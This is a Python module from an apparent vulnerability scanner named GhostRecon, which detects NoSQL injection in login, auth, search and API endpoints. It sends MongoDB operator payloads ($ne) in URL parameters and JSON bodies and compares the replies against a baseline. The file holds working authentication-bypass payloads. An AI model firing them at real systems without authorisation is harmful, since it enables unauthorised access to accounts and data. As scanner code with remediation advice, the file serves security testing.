"""
NoSQLModule — GhostRecon module.
Detects NoSQL injection via operator injection ($gt, $ne).
"""
import json
import time
import urllib.parse
import hashlib

try:
    import requests
except ImportError:
    requests = None

from modules import BaseModule


class NoSQLModule(BaseModule):
    NAME = "NoSQL Injection"

    def run(self):
        self.ui.section("NoSQL Injection Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        found = 0

        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:20]

        for endpoint in endpoints:
            # Skip likely static assets
            if endpoint.endswith((".jpg", ".png", ".js", ".css", ".html")):
                continue

            # We need endpoints that accept parameters. Let's test URL params and JSON body
            # For simplicity, we'll test common auth/search endpoints if present
            if any(x in endpoint for x in ["login", "auth", "search", "user", "api"]):
                # 1. URL Parameter Injection
                # Normally we'd look for ?user=admin. We simulate an injected request: ?user[$ne]=invalid
                payload_url = f"{endpoint}?username[$ne]=ghostrecon&password[$ne]=ghostrecon"
                baseline_url = f"{endpoint}?username=ghostrecon&password=ghostrecon"

                try:
                    resp_base = s.get(baseline_url, timeout=self.timeout)
                    resp_payload = s.get(payload_url, timeout=self.timeout)

                    base_hash = hashlib.md5(resp_base.text.encode()).hexdigest()
                    payload_hash = hashlib.md5(resp_payload.text.encode()).hexdigest()

                    # Differential analysis: if the response differs significantly when using NoSQL operators
                    if base_hash != payload_hash and abs(len(resp_base.text) - len(resp_payload.text)) > 50:
                        # Ensure it's not just a general error page difference
                        if resp_payload.status_code in [200, 201, 301, 302]:
                            self.db.add(
                                title="NoSQL Injection — Operator Injection in URL",
                                severity="high", url=endpoint, module=self.NAME,
                                description=(
                                    "Endpoint exhibits different behavior when MongoDB operators ($ne) are used "
                                    "in query parameters. This strongly suggests a NoSQL injection vulnerability."
                                ),
                                remediation="Sanitize input and do not pass raw user input objects directly to NoSQL queries.",
                                cvss="8.5",
                                confidence="HIGH",
                                confidence_score=80,
                                validation_steps=["differential_analysis"],
                                evidence=[f"Payload URL: {payload_url}"]
                            )
                            self.ui.find("high", "NoSQL Injection (URL)", endpoint)
                            found += 1
                except Exception:
                    pass

                # 2. JSON Body Injection (if endpoint accepts POST)
                json_payload = {"username": {"$ne": "ghostrecon"}, "password": {"$ne": "ghostrecon"}}
                json_baseline = {"username": "ghostrecon", "password": "ghostrecon"}
                headers = {"Content-Type": "application/json"}

                try:
                    resp_base = s.post(endpoint, json=json_baseline, headers=headers, timeout=self.timeout)
                    resp_payload = s.post(endpoint, json=json_payload, headers=headers, timeout=self.timeout)

                    base_hash = hashlib.md5(resp_base.text.encode()).hexdigest()
                    payload_hash = hashlib.md5(resp_payload.text.encode()).hexdigest()

                    if base_hash != payload_hash and abs(len(resp_base.text) - len(resp_payload.text)) > 50:
                        if resp_payload.status_code in [200, 201, 301, 302] and resp_base.status_code != resp_payload.status_code:
                             self.db.add(
                                title="NoSQL Injection — Operator Injection in JSON",
                                severity="critical", url=endpoint, module=self.NAME,
                                description=(
                                    "Endpoint exhibits authentication bypass or data disclosure when MongoDB operators "
                                    "are used in JSON payloads. The response status changed from "
                                    f"{resp_base.status_code} (baseline) to {resp_payload.status_code} (payload)."
                                ),
                                remediation="Sanitize input and enforce strict schema validation for JSON APIs.",
                                cvss="9.1",
                                confidence="CONFIRMED",
                                confidence_score=90,
                                validation_steps=["differential_analysis_status_change"],
                                evidence=[f"Payload: {json.dumps(json_payload)}"]
                            )
                             self.ui.find("critical", "NoSQL Injection (JSON)", endpoint)
                             found += 1
                except Exception:
                    pass

            time.sleep(self.delay)

        if found == 0:
            self.ui.info("No NoSQL Injection vulnerabilities detected.")
